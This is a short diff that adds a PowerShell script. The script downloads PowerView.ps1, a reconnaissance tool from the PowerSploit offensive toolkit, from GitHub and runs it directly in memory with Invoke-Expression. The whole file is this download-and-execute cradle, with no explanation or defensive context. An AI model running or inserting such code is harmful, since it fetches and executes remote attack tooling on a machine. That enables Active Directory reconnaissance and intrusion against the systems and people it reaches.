@@ -1,0 +1,5 @@
+$Proxy=New-object System.Net.WebProxy
+$WebSession=new-object Microsoft.PowerShell.Commands.WebRequestSession
+$WebSession.Proxy=$Proxy
+$scriptContent = Invoke-WebRequest -Method Get -Uri "https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Recon/PowerView.ps1" -WebSession $WebSession
+Invoke-Expression $scriptContent.Content
